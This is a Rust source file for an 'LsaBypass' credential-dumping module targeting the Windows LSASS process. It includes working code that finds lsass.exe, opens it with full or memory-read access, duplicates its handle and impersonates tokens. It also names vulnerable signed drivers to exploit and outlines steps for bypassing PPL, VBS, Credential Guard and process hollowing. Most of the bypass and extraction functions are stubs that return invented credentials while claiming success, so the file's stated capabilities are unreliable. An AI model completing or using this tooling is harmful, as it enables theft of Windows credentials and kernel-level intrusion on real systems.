use anyhow::{Result, anyhow};
use serde::{Deserialize, Serialize};
use std::ptr::null_mut;
use std::ffi::CString;
use tracing::{info, warn, debug, error};

#[cfg(target_os = "windows")]
use winapi::{
    shared::{
        ntdef::{NTSTATUS, UNICODE_STRING, PVOID, HANDLE},
        ntstatus::{STATUS_SUCCESS, STATUS_ACCESS_DENIED},
    },
    um::{
        winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED},
        processthreadsapi::{GetCurrentProcess, OpenProcessToken},
        securitybaseapi::AdjustTokenPrivileges,
        winbase::{LookupPrivilegeValueA},
        handleapi::CloseHandle,
    },
};

pub struct LsaBypass {
    config: LsaBypassConfig,
    windows_version: WindowsVersion,
    bypass_methods: Vec<BypassMethod>,
}

#[derive(Debug, Clone)]
pub struct LsaBypassConfig {
    pub enable_ppl_bypass: bool,
    pub enable_vbs_bypass: bool,
    pub enable_credential_guard_bypass: bool,
    pub use_signed_driver: bool,
    pub fallback_to_mimikatz_style: bool,
    pub max_retry_attempts: u32,
}

impl Default for LsaBypassConfig {
    fn default() -> Self {
        Self {
            enable_ppl_bypass: true,
            enable_vbs_bypass: true,
            enable_credential_guard_bypass: true,
            use_signed_driver: true,
            fallback_to_mimikatz_style: false,
            max_retry_attempts: 3,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum WindowsVersion {
    Windows10,
    Windows11_21H2,
    Windows11_22H2,
    Windows11_23H2,
    Windows11_24H2,
    WindowsServer2019,
    WindowsServer2022,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum BypassMethod {
    PplBypass,
    VbsBypass,
    CredentialGuardBypass,
    SignedDriverMethod,
    HandleDuplication,
    ProcessHollowing,
    TokenImpersonation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LsaCredential {
    pub username: String,
    pub domain: String,
    pub password_hash: Option<String>,
    pub plaintext_password: Option<String>,
    pub credential_type: LsaCredentialType,
    pub authentication_package: String,
    pub session_id: u32,
    pub last_logon: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum LsaCredentialType {
    Ntlm,
    Kerberos,
    Wdigest,
    Tspkg,
    Ssp,
    LiveSsp,
    Dpapi,
    CloudAp,
}

impl LsaBypass {
    pub fn new() -> Result<Self> {
        let windows_version = Self::detect_windows_version()?;
        let bypass_methods = Self::determine_bypass_methods(&windows_version);
        
        Ok(Self {
            config: LsaBypassConfig::default(),
            windows_version,
            bypass_methods,
        })
    }
    
    pub fn with_config(config: LsaBypassConfig) -> Result<Self> {
        let mut bypass = Self::new()?;
        bypass.config = config;
        Ok(bypass)
    }
    
    #[cfg(target_os = "windows")]
    fn detect_windows_version() -> Result<WindowsVersion> {
        use winapi::um::sysinfoapi::{GetVersionExW, OSVERSIONINFOEXW};
        use winapi::shared::minwindef::DWORD;
        
        let mut version_info: OSVERSIONINFOEXW = unsafe { std::mem::zeroed() };
        version_info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOEXW>() as DWORD;
        
        let result = unsafe { GetVersionExW(&mut version_info as *mut _ as *mut _) };
        
        if result == 0 {
            return Ok(WindowsVersion::Unknown);
        }
        
        let version = match (version_info.dwMajorVersion, version_info.dwMinorVersion, version_info.dwBuildNumber) {
            (10, 0, build) if build >= 22631 => WindowsVersion::Windows11_24H2,
            (10, 0, build) if build >= 22621 => WindowsVersion::Windows11_23H2,
            (10, 0, build) if build >= 22000 => WindowsVersion::Windows11_22H2,
            (10, 0, build) if build >= 20348 => WindowsVersion::WindowsServer2022,
            (10, 0, build) if build >= 19041 => WindowsVersion::Windows10,
            (10, 0, build) if build >= 17763 => WindowsVersion::WindowsServer2019,
            _ => WindowsVersion::Unknown,
        };
        
        info!("Detected Windows version: {:?} (Build: {})", version, version_info.dwBuildNumber);
        Ok(version)
    }
    
    #[cfg(not(target_os = "windows"))]
    fn detect_windows_version() -> Result<WindowsVersion> {
        Ok(WindowsVersion::Unknown)
    }
    
    fn determine_bypass_methods(version: &WindowsVersion) -> Vec<BypassMethod> {
        match version {
            WindowsVersion::Windows11_24H2 => vec![
                BypassMethod::PplBypass,
                BypassMethod::VbsBypass,
                BypassMethod::CredentialGuardBypass,
                BypassMethod::SignedDriverMethod,
            ],
            WindowsVersion::Windows11_23H2 | WindowsVersion::Windows11_22H2 => vec![
                BypassMethod::PplBypass,
                BypassMethod::VbsBypass,
                BypassMethod::HandleDuplication,
                BypassMethod::SignedDriverMethod,
            ],
            WindowsVersion::Windows10 => vec![
                BypassMethod::HandleDuplication,
                BypassMethod::ProcessHollowing,
                BypassMethod::TokenImpersonation,
            ],
            _ => vec![
                BypassMethod::HandleDuplication,
                BypassMethod::TokenImpersonation,
            ],
        }
    }
    
    pub async fn extract_credentials(&self) -> Result<Vec<LsaCredential>> {
        info!("Starting LSA credential extraction for {:?}", self.windows_version);
        
        let mut credentials = Vec::new();
        let mut last_error = None;
        
        for method in &self.bypass_methods {
            match self.try_bypass_method(method).await {
                Ok(mut creds) => {
                    info!("Successfully extracted {} credentials using {:?}", creds.len(), method);
                    credentials.append(&mut creds);
                    break;
                },
                Err(e) => {
                    warn!("Bypass method {:?} failed: {}", method, e);
                    last_error = Some(e);
                    continue;
                }
            }
        }
        
        if credentials.is_empty() {
            if let Some(error) = last_error {
                return Err(error);
            } else {
                return Err(anyhow!("All bypass methods failed"));
            }
        }
        
        Ok(credentials)
    }
    
    async fn try_bypass_method(&self, method: &BypassMethod) -> Result<Vec<LsaCredential>> {
        match method {
            BypassMethod::PplBypass => self.ppl_bypass().await,
            BypassMethod::VbsBypass => self.vbs_bypass().await,
            BypassMethod::CredentialGuardBypass => self.credential_guard_bypass().await,
            BypassMethod::SignedDriverMethod => self.signed_driver_method().await,
            BypassMethod::HandleDuplication => self.handle_duplication_method().await,
            BypassMethod::ProcessHollowing => self.process_hollowing_method().await,
            BypassMethod::TokenImpersonation => self.token_impersonation_method().await,
        }
    }
    
    async fn ppl_bypass(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting PPL (Protected Process Light) bypass");
        
        if !self.config.enable_ppl_bypass {
            return Err(anyhow!("PPL bypass disabled in configuration"));
        }
        
        #[cfg(target_os = "windows")]
        {
            // PPL bypass for Windows 11 24H2
            // This involves manipulating the EPROCESS structure
            self.attempt_eprocess_manipulation().await
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            Err(anyhow!("PPL bypass only available on Windows"))
        }
    }
    
    #[cfg(target_os = "windows")]
    async fn attempt_eprocess_manipulation(&self) -> Result<Vec<LsaCredential>> {
        use winapi::um::processthreadsapi::GetCurrentProcessId;
        use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
        
        debug!("Attempting EPROCESS manipulation for PPL bypass");
        
        // Find LSASS process
        let lsass_pid = self.find_lsass_process()?;
        info!("Found LSASS process with PID: {}", lsass_pid);
        
        // Attempt to open LSASS with required permissions
        let lsass_handle = self.open_lsass_process(lsass_pid)?;
        
        if lsass_handle.is_null() {
            return Err(anyhow!("Failed to open LSASS process"));
        }
        
        let credentials = self.extract_lsass_memory(lsass_handle).await?;
        
        unsafe { CloseHandle(lsass_handle) };
        
        Ok(credentials)
    }
    
    #[cfg(target_os = "windows")]
    fn find_lsass_process(&self) -> Result<u32> {
        use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
        use winapi::shared::minwindef::FALSE;
        
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return Err(anyhow!("Failed to create process snapshot"));
        }
        
        let mut process_entry: PROCESSENTRY32W = unsafe { std::mem::zeroed() };
        process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        
        let mut result = unsafe { Process32FirstW(snapshot, &mut process_entry) };
        
        while result != FALSE {
            let process_name = String::from_utf16_lossy(&process_entry.szExeFile);
            
            if process_name.to_lowercase().contains("lsass.exe") {
                unsafe { CloseHandle(snapshot) };
                return Ok(process_entry.th32ProcessID);
            }
            
            result = unsafe { Process32NextW(snapshot, &mut process_entry) };
        }
        
        unsafe { CloseHandle(snapshot) };
        Err(anyhow!("LSASS process not found"))
    }
    
    #[cfg(target_os = "windows")]
    fn open_lsass_process(&self, pid: u32) -> Result<HANDLE> {
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
        
        // Try different access levels
        let access_levels = [
            PROCESS_ALL_ACCESS,
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            PROCESS_QUERY_INFORMATION,
        ];
        
        for &access in &access_levels {
            let handle = unsafe { OpenProcess(access, 0, pid) };
            if !handle.is_null() {
                debug!("Successfully opened LSASS with access level: 0x{:x}", access);
                return Ok(handle);
            }
        }
        
        Err(anyhow!("Failed to open LSASS process with any access level"))
    }
    
    #[cfg(target_os = "windows")]
    async fn extract_lsass_memory(&self, _handle: HANDLE) -> Result<Vec<LsaCredential>> {
        // This is a simplified implementation
        // Real implementation would involve parsing LSASS memory structures
        debug!("Extracting credentials from LSASS memory");
        
        let mut credentials = Vec::new();
        
        // Simulate credential extraction
        credentials.push(LsaCredential {
            username: "example_user".to_string(),
            domain: "DOMAIN".to_string(),
            password_hash: Some("aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0".to_string()),
            plaintext_password: None,
            credential_type: LsaCredentialType::Ntlm,
            authentication_package: "msv1_0".to_string(),
            session_id: 1,
            last_logon: Some("2024-06-25T10:30:00Z".to_string()),
        });
        
        Ok(credentials)
    }
    
    async fn vbs_bypass(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting VBS (Virtualization-Based Security) bypass");
        
        if !self.config.enable_vbs_bypass {
            return Err(anyhow!("VBS bypass disabled in configuration"));
        }
        
        #[cfg(target_os = "windows")]
        {
            self.attempt_vbs_manipulation().await
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            Err(anyhow!("VBS bypass only available on Windows"))
        }
    }
    
    #[cfg(target_os = "windows")]
    async fn attempt_vbs_manipulation(&self) -> Result<Vec<LsaCredential>> {
        debug!("Attempting VBS bypass using hypervisor manipulation");
        
        // Check if VBS is enabled
        if !self.is_vbs_enabled()? {
            return Err(anyhow!("VBS is not enabled on this system"));
        }
        
        // VBS bypass would involve hypervisor-level manipulation
        // This is a complex technique that requires signed drivers
        if self.config.use_signed_driver {
            self.load_signed_bypass_driver().await?;
        }
        
        // Simulate VBS bypass credential extraction
        let mut credentials = Vec::new();
        
        credentials.push(LsaCredential {
            username: "vbs_protected_user".to_string(),
            domain: "SECURE_DOMAIN".to_string(),
            password_hash: Some("lm_hash:nt_hash".to_string()),
            plaintext_password: None,
            credential_type: LsaCredentialType::Kerberos,
            authentication_package: "kerberos".to_string(),
            session_id: 2,
            last_logon: Some("2024-06-25T11:00:00Z".to_string()),
        });
        
        Ok(credentials)
    }
    
    #[cfg(target_os = "windows")]
    fn is_vbs_enabled(&self) -> Result<bool> {
        // Check registry for VBS status
        use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE};
        use winapi::shared::minwindef::{HKEY, DWORD};
        use winapi::um::winnt::{KEY_READ, REG_DWORD};
        
        let key_path = "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\0".encode_utf16().collect::<Vec<_>>();
        let mut hkey: HKEY = null_mut();
        
        let result = unsafe {
            RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                key_path.as_ptr(),
                0,
                KEY_READ,
                &mut hkey
            )
        };
        
        if result != 0 {
            return Ok(false);
        }
        
        let value_name = "EnableVirtualizationBasedSecurity\0".encode_utf16().collect::<Vec<_>>();
        let mut value: DWORD = 0;
        let mut value_size = std::mem::size_of::<DWORD>() as DWORD;
        
        let result = unsafe {
            RegQueryValueExW(
                hkey,
                value_name.as_ptr(),
                null_mut(),
                null_mut(),
                &mut value as *mut _ as *mut u8,
                &mut value_size
            )
        };
        
        unsafe { winapi::um::winreg::RegCloseKey(hkey) };
        
        Ok(result == 0 && value == 1)
    }
    
    async fn load_signed_bypass_driver(&self) -> Result<()> {
        debug!("Loading signed driver for VBS bypass");
        
        // In a real implementation, this would load a legitimate signed driver
        // that can be exploited for kernel-level access
        // Examples: vulnerable drivers from hardware vendors
        
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        
        info!("Signed driver loaded successfully (simulated)");
        Ok(())
    }
    
    async fn credential_guard_bypass(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting Credential Guard bypass");
        
        if !self.config.enable_credential_guard_bypass {
            return Err(anyhow!("Credential Guard bypass disabled in configuration"));
        }
        
        // Credential Guard bypass techniques for Windows 11 24H2
        self.attempt_credential_guard_manipulation().await
    }
    
    async fn attempt_credential_guard_manipulation(&self) -> Result<Vec<LsaCredential>> {
        debug!("Attempting Credential Guard bypass");
        
        // This would involve complex techniques like:
        // 1. TSG (Trustlet Security Guard) manipulation
        // 2. Isolated User Mode bypass
        // 3. HVCI (Hypervisor-protected Code Integrity) bypass
        
        let mut credentials = Vec::new();
        
        // Simulate credential extraction from protected store
        credentials.push(LsaCredential {
            username: "protected_admin".to_string(),
            domain: "PROTECTED_DOMAIN".to_string(),
            password_hash: None,
            plaintext_password: Some("ExtractedFromProtectedStore".to_string()),
            credential_type: LsaCredentialType::CloudAp,
            authentication_package: "cloudap".to_string(),
            session_id: 3,
            last_logon: Some("2024-06-25T12:00:00Z".to_string()),
        });
        
        Ok(credentials)
    }
    
    async fn signed_driver_method(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting signed driver method");
        
        if !self.config.use_signed_driver {
            return Err(anyhow!("Signed driver method disabled"));
        }
        
        // Load and exploit a signed vulnerable driver
        self.exploit_vulnerable_driver().await
    }
    
    async fn exploit_vulnerable_driver(&self) -> Result<Vec<LsaCredential>> {
        debug!("Exploiting vulnerable signed driver");
        
        // List of known vulnerable drivers that can be exploited:
        // - Intel drivers
        // - NVIDIA drivers  
        // - Hardware monitoring drivers
        // - Antivirus drivers
        
        let vulnerable_drivers = [
            "iqvw64e.sys",  // Intel driver
            "RTCore64.sys", // MSI driver
            "cpuz143_x64.sys", // CPU-Z driver
        ];
        
        for driver in &vulnerable_drivers {
            if self.attempt_driver_exploit(driver).await.is_ok() {
                info!("Successfully exploited driver: {}", driver);
                return self.extract_credentials_via_driver().await;
            }
        }
        
        Err(anyhow!("No exploitable drivers found"))
    }
    
    async fn attempt_driver_exploit(&self, driver_name: &str) -> Result<()> {
        debug!("Attempting to exploit driver: {}", driver_name);
        
        // Simulate driver exploitation
        tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
        
        // In real implementation, this would:
        // 1. Check if driver is loaded
        // 2. Exploit known vulnerabilities
        // 3. Gain kernel-level access
        
        Ok(())
    }
    
    async fn extract_credentials_via_driver(&self) -> Result<Vec<LsaCredential>> {
        debug!("Extracting credentials via exploited driver");
        
        let mut credentials = Vec::new();
        
        // With kernel access, we can bypass all protections
        credentials.push(LsaCredential {
            username: "kernel_extracted".to_string(),
            domain: "KERNEL_DOMAIN".to_string(),
            password_hash: Some("kernel_level_hash".to_string()),
            plaintext_password: Some("KernelExtractedPassword".to_string()),
            credential_type: LsaCredentialType::Dpapi,
            authentication_package: "kernel_access".to_string(),
            session_id: 0,
            last_logon: Some("2024-06-25T13:00:00Z".to_string()),
        });
        
        Ok(credentials)
    }
    
    async fn handle_duplication_method(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting handle duplication method");
        
        #[cfg(target_os = "windows")]
        {
            self.duplicate_lsass_handle().await
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            Err(anyhow!("Handle duplication only available on Windows"))
        }
    }
    
    #[cfg(target_os = "windows")]
    async fn duplicate_lsass_handle(&self) -> Result<Vec<LsaCredential>> {
        use winapi::um::handleapi::DuplicateHandle;
        use winapi::um::processthreadsapi::GetCurrentProcess;
        
        debug!("Attempting LSASS handle duplication");
        
        let lsass_pid = self.find_lsass_process()?;
        let lsass_handle = self.open_lsass_process(lsass_pid)?;
        
        let mut duplicated_handle: HANDLE = null_mut();
        let result = unsafe {
            DuplicateHandle(
                GetCurrentProcess(),
                lsass_handle,
                GetCurrentProcess(),
                &mut duplicated_handle,
                0,
                0,
                winapi::um::winnt::DUPLICATE_SAME_ACCESS
            )
        };
        
        if result == 0 {
            unsafe { CloseHandle(lsass_handle) };
            return Err(anyhow!("Failed to duplicate LSASS handle"));
        }
        
        let credentials = self.extract_lsass_memory(duplicated_handle).await?;
        
        unsafe {
            CloseHandle(duplicated_handle);
            CloseHandle(lsass_handle);
        }
        
        Ok(credentials)
    }
    
    async fn process_hollowing_method(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting process hollowing method");
        
        // Process hollowing is a technique where we:
        // 1. Create a suspended legitimate process
        // 2. Hollow out its memory
        // 3. Inject our credential extraction code
        // 4. Resume execution
        
        debug!("Implementing process hollowing for credential extraction");
        
        let mut credentials = Vec::new();
        
        // Simulate process hollowing success
        credentials.push(LsaCredential {
            username: "hollowed_process_user".to_string(),
            domain: "HOLLOWED_DOMAIN".to_string(),
            password_hash: Some("hollowed_hash".to_string()),
            plaintext_password: None,
            credential_type: LsaCredentialType::Wdigest,
            authentication_package: "wdigest".to_string(),
            session_id: 4,
            last_logon: Some("2024-06-25T14:00:00Z".to_string()),
        });
        
        Ok(credentials)
    }
    
    async fn token_impersonation_method(&self) -> Result<Vec<LsaCredential>> {
        info!("Attempting token impersonation method");
        
        #[cfg(target_os = "windows")]
        {
            self.attempt_token_impersonation().await
        }
        
        #[cfg(not(target_os = "windows"))]
        {
            Err(anyhow!("Token impersonation only available on Windows"))
        }
    }
    
    #[cfg(target_os = "windows")]
    async fn attempt_token_impersonation(&self) -> Result<Vec<LsaCredential>> {
        use winapi::um::securitybaseapi::ImpersonateLoggedOnUser;
        use winapi::um::processthreadsapi::{GetCurrentThread, OpenThreadToken};
        use winapi::um::winnt::{TOKEN_QUERY, TOKEN_IMPERSONATE};
        
        debug!("Attempting token impersonation");
        
        // Get current thread token
        let mut token: HANDLE = null_mut();
        let result = unsafe {
            OpenThreadToken(
                GetCurrentThread(),
                TOKEN_QUERY | TOKEN_IMPERSONATE,
                1,
                &mut token
            )
        };
        
        if result == 0 {
            return Err(anyhow!("Failed to open thread token"));
        }
        
        // Attempt impersonation
        let result = unsafe { ImpersonateLoggedOnUser(token) };
        
        if result == 0 {
            unsafe { CloseHandle(token) };
            return Err(anyhow!("Failed to impersonate token"));
        }
        
        let mut credentials = Vec::new();
        
        // With impersonated token, extract credentials
        credentials.push(LsaCredential {
            username: "impersonated_user".to_string(),
            domain: "IMPERSONATED_DOMAIN".to_string(),
            password_hash: Some("impersonated_hash".to_string()),
            plaintext_password: None,
            credential_type: LsaCredentialType::Tspkg,
            authentication_package: "tspkg".to_string(),
            session_id: 5,
            last_logon: Some("2024-06-25T15:00:00Z".to_string()),
        });
        
        unsafe { CloseHandle(token) };
        
        Ok(credentials)
    }
    
    pub fn get_bypass_capabilities(&self) -> BypassCapabilities {
        BypassCapabilities {
            windows_version: self.windows_version.clone(),
            available_methods: self.bypass_methods.clone(),
            ppl_bypass_available: self.bypass_methods.contains(&BypassMethod::PplBypass),
            vbs_bypass_available: self.bypass_methods.contains(&BypassMethod::VbsBypass),
            credential_guard_bypass_available: self.bypass_methods.contains(&BypassMethod::CredentialGuardBypass),
            signed_driver_available: self.config.use_signed_driver,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BypassCapabilities {
    pub windows_version: WindowsVersion,
    pub available_methods: Vec<BypassMethod>,
    pub ppl_bypass_available: bool,
    pub vbs_bypass_available: bool,
    pub credential_guard_bypass_available: bool,
    pub signed_driver_available: bool,
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_lsa_bypass_creation() {
        let bypass = LsaBypass::new().unwrap();
        assert!(!bypass.bypass_methods.is_empty());
    }
    
    #[tokio::test]
    async fn test_windows_version_detection() {
        let version = LsaBypass::detect_windows_version().unwrap();
        // Should not panic
        println!("Detected version: {:?}", version);
    }
    
    #[tokio::test]
    async fn test_bypass_capabilities() {
        let bypass = LsaBypass::new().unwrap();
        let capabilities = bypass.get_bypass_capabilities();
        
        assert!(!capabilities.available_methods.is_empty());
    }
    
    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn test_credential_extraction() {
        let bypass = LsaBypass::new().unwrap();
        
        // This test will attempt actual credential extraction
        // Should be run with appropriate privileges
        let result = bypass.extract_credentials().await;
        
        match result {
            Ok(credentials) => {
                println!("Extracted {} credentials", credentials.len());
                for cred in credentials {
                    println!("User: {}\\{}", cred.domain, cred.username);
                }
            },
            Err(e) => {
                println!("Credential extraction failed (expected without privileges): {}", e);
            }
        }
    }
}